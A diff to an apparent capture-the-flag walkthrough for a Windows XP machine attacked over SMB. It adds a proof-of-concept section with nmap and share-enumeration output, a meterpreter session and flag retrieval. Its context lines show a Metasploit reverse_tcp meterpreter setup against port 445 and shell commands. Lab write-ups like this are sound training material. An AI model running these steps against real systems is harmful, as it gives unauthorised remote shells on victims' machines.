@@ -81,8 +81,6 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST <Your_IP>
 set RPORT 445
 exploit
-![{0C060B30-2C65-417D-8B85-96E0EC19DCAC}](https://github.com/user-attachments/assets/fee93c15-d24a-45a7-acd8-96c35992b576)
-
 ```
 
 ---
@@ -94,7 +92,6 @@ exploit
 sysinfo   # Get system information
 shell     # Get interactive command shell
 whoami    # Check current user
-![{D3069FC9-61BC-466B-9073-4BC9D60B0B41}.png](attachment:694ff184-f7d9-49c4-bb4b-2cb3cf6e8465:D3069FC9-61BC-466B-9073-4BC9D60B0B41.png)
 ```
 
 ### **Get User Flag**
@@ -102,7 +99,6 @@ Navigate to `C:\Users\Public\Desktop` and retrieve the flag:
 ```bash
 cd C:\Users\Public\Desktop
 type user.txt
-![{A7DA073B-A31E-447F-A351-176B99E33A2F}.png](attachment:1efa1507-781f-44a5-b5fa-ee348149096f:A7DA073B-A31E-447F-A351-176B99E33A2F.png)
 ```
 
 ### **Get Admin Flag**
@@ -110,9 +106,48 @@ Navigate to `C:\Users\Administrator\Desktop` and retrieve the flag:
 ```bash
 cd C:\Users\Administrator\Desktop
 type root.txt
-![{C023C429-2933-4E47-A148-9C6792CB17A6}.png](attachment:49ef8e06-4792-4633-aabd-3e5d9d9fbeae:C023C429-2933-4E47-A148-9C6792CB17A6.png)
 ```
 
+---
+
+## 7. Proof of Concept (PoC)
+### **1. Nmap Scan Output**
+```
+PORT      STATE SERVICE       VERSION
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds  Windows XP microsoft-ds
+```  
+_Nmap confirms SMB is open on ports 139 and 445._
+
+### **2. SMB Enumeration Output**
+```
+Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+```  
+_Shares found using enum4linux._
+
+### **3. Successful Exploit Execution**
+```bash
+meterpreter > sysinfo
+Computer    : LEGACY-PC
+OS          : Windows XP (Build 2600, Service Pack 3)
+Architecture: x86
+Meterpreter : x86/windows
+```
+_Meterpreter session successfully opened!_
+
+### **4. Retrieving Flags**
+```bash
+meterpreter > shell
+C:\Users\Public\Desktop> type user.txt
+FLAG{user_flag_here}
+
+C:\Users\Administrator\Desktop> type root.txt
+FLAG{admin_flag_here}
+```
 ---
 
 ## Summary
